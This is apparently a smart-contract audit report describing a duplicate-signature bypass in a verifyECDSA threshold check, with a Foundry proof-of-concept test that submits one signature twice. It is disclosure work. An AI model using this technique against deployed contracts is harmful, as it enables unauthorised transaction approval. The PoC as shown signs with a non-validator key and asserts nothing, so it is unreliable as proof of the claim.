# Vulnerability details

## Impact
The signature verification logic in the verifyECDSA function does not properly handle duplicate signatures from the same validator. This allows an attacker to submit the same validator's signature multiple times, effectively bypassing the minimum required number of distinct validators to approve a transaction. This issue can result in unauthorized transaction approval, compromising the integrity of the signature verification process.

contract DuplicateSignatureBypassTest is Test {
    using ECDSA for bytes32;

    SettlementSignatureVerifier verifier;
    uint256 privateKey =
        0x1010101010101010101010101010101010101010101010101010101010101010;

    address owner;
    address validator1;

    bytes32 public constant MANAGER_ROLE = keccak256("MANAGER_ROLE");

    function setUp() public {
        owner = vm.addr(privateKey);
        validator1 = vm.addr(0x1);

        // Deploy the verifier contract
        verifier = new SettlementSignatureVerifier();
        verifier.initialize(owner, 2);  // Initialize with required validators set to 2

        // Grant MANAGER_ROLE to the owner to be able to add validators
        vm.prank(owner);  // Simulate the next action as if it's performed by the owner
        verifier.grantRole(MANAGER_ROLE, owner);  // Grant the MANAGER_ROLE to the owner

        // Add validator1 as a valid validator
        vm.prank(owner);  // Simulate the next action as if it's performed by the owner
        verifier.add_validator(validator1);
    }

    function getEthSignedMessageHash(bytes32 _messageHash)
        public
        pure
        returns (bytes32)
    {
        /*
        Signature is produced by signing a keccak256 hash with the following format:
        "\x19Ethereum Signed Message\n" + len(msg) + msg
        */
        return keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", _messageHash)
        );
    }


    function testDuplicateSignatureBypass() public {
        string memory message = "attack at dawn";

        bytes32 msgHash = getEthSignedMessageHash(keccak256(abi.encode(message)));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, msgHash);

        bytes memory signature = abi.encodePacked(r, s, v);
        assertEq(signature.length, 65);
        // Send the same signature twice to simulate the bypass

        console.logBytes(signature);
        bytes memory signatures = abi.encodePacked(signature, signature);

        bool result = verifier.verifyECDSA(msgHash, signatures);
    }
}
